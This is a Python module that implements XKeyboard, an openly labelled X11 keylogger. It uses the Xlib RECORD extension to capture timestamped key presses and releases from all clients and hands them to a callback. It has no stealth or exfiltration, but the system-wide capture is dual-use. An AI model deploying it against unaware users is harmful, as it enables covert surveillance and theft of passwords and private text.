# XKeyboard - An X Window System keylogger - based on the python-xlib
# "record-demo" example from Alex Badea <vamposdecampos@gmail.com>, see
# https://github.com/alexer/python-xlib/blob/master/examples/record_demo.py
# Copyright (C) 2018  Matthias Gazzari
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

"""An X Window System keylogger based on Xlib using the RECORD extension."""

import time
import Xlib
from Xlib import XK, display
import threading

class NotSupportedError(Exception):
    """Generic NotSupportedError."""
    pass

class XKeyboard():
    """X Window System keylogger."""

    def __init__(self):
        Xlib.XK.load_keysym_group("xkb")
        self.ctrl_disp = display.Display()

    def record(self, handler, escape_key="Escape", stop_flag=threading.Event()):
        '''
        Start keylogging (blocks until the "escape" key has been hit.
        
        :param escape_key: The X11 string representation of the key for terminating the recording
        '''
        # initialise required resources
        record_disp = display.Display()
        if not record_disp.has_extension("RECORD"):
            raise NotSupportedError("RECORD extension support is required")

        # initialise recording context to capture keypress and keyrelease events
        context = record_disp.record_create_context(
            0,
            [Xlib.ext.record.AllClients],
            [{
                "core_requests": (0, 0),
                "core_replies": (0, 0),
                "ext_requests": (0, 0, 0, 0),
                "ext_replies": (0, 0, 0, 0),
                "delivered_events": (0, 0),
                "device_events": (Xlib.X.KeyPress, Xlib.X.KeyRelease),
                "errors": (0, 0),
                "client_started": False,
                "client_died": False,
            }]
        )

        # define callback to be called on X11 events
        parser = Xlib.protocol.rq.EventField(None)
        def callback(reply):
            current_time = time.time()
            # ignore reply under certain conditions
            if reply.category != Xlib.ext.record.FromServer or reply.client_swapped:
                return

            # extract events by consuming the data of the reply
            data = reply.data
            while data:
                event, data = parser.parse_binary_value(data, record_disp.display, None, None)
                if event.type in (Xlib.X.KeyPress, Xlib.X.KeyRelease):
                    # decode key event
                    event_type = "press" if event.type == Xlib.X.KeyPress else "release"
                    keycode = event.detail
                    keysym = self.keycode_to_keysym(keycode)

                    # terminate on pressing the "escape" key
                    if keysym == escape_key:
                        stop_flag.set()
                        return
                    # execute provided handler
                    if handler:
                        handler(current_time, keycode, keysym, event_type)

        # disable the recording context on stop_flag being set
        def stop_callback():
            stop_flag.wait()
            self.ctrl_disp.record_disable_context(context)
            self.ctrl_disp.flush()

        threading.Thread(target=stop_callback).start()
        try:
            # start recording (blocking)
            record_disp.record_enable_context(context, callback)
        finally:
            # free ressources
            record_disp.record_free_context(context)
            record_disp.close()

    def keycode_to_keysym(self, keycode):
        """
        Translate a keycode to the current keysym representation (keyboard layout dependent)

        :param handler: the keycode to be translated
        :returns: the keysym string (either a string or a number if no representation was found)
        """
        keysym = self.ctrl_disp.keycode_to_keysym(keycode, 0)
        for name in dir(XK):
            if name[:3] == "XK_" and getattr(XK, name) == keysym:
                return name[3:]
        return f"[{keysym}]"
